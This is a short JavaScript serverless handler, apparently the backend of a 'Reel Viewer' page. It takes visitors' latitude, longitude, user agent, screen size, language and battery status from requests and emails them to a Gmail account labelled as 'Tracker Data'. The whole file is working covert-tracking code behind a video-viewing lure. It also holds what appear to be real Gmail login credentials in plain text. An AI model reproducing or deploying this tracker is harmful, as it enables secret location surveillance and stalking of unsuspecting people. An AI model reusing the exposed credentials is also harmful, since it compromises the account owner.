
export default async function handler(req, res) {
  const nodemailer = require("nodemailer");

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "akki.akshayx@gmail.com",
      pass: "Akki@963"
    },
  });

  const { latitude, longitude, userAgent, screen, language, battery } = req.body;

  const mailOptions = {
    from: "akki.akshayx@gmail.com",
    to: "akki.akshayx@gmail.com",
    subject: "Tracker Data from Reel Viewer",
    text: `
Location: ${latitude}, ${longitude}
Device: ${userAgent}
Screen: ${screen}
Language: ${language}
Battery: ${battery}
`
  };

  await transporter.sendMail(mailOptions);
  res.status(200).json({ status: "sent" });
}
